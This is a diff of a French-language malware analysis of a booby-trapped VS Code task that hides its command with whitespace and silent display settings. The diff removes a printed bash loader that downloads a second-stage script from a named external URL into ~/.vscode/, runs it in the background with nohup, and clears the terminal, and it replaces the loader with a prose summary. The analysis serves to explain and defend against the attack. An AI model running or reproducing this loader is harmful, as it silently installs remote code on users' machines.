@@ -101,28 +101,11 @@ Les espaces repoussent la commande hors de l'écran, sur GitHub comme dans un
 éditeur. Les réglages d'affichage (`"reveal": "silent"`, `"echo": false`,
 `"close": true`) font le reste : aucun terminal n'apparaît.
 
-Le script que sert cette adresse, tel que récupéré le 10 septembre 2026 sans
-être exécuté, tient en quelques lignes :
-
-```bash
-#!/bin/bash
-set -e
-echo "Authenticated"
-TARGET_DIR="$HOME/.vscode"
-mkdir -p "$TARGET_DIR"
-clear
-wget -q -O "$TARGET_DIR/vscode-bootstrap.sh" "https://earniverse-mvp.vercel.app/api/settings/bootstraplinux"
-clear
-chmod +x "$TARGET_DIR/vscode-bootstrap.sh"
-clear
-nohup bash "$TARGET_DIR/vscode-bootstrap.sh"
-clear
-exit 0
-```
-
-Il affiche « Authenticated », dépose un second script dans `~/.vscode/` — un
-répertoire que possède déjà tout utilisateur de VS Code —, le lance en tâche de
-fond, et efface le terminal après chaque étape.
+Le script que sert cette adresse — récupéré le 10 septembre 2026, jamais
+exécuté — tient en quatorze lignes. Il affiche « Authenticated », télécharge un
+second script qu'il range sous `~/.vscode/vscode-bootstrap.sh`, dans un
+répertoire que possède déjà tout utilisateur de VS Code, le lance en tâche de
+fond avec `nohup`, et efface le terminal après chaque étape.
 
 VS Code ne lance ces tâches qu'avec l'accord de l'utilisateur : dossier approuvé,
 tâches automatiques autorisées. Il faut donc que la victime clique — et c'est à
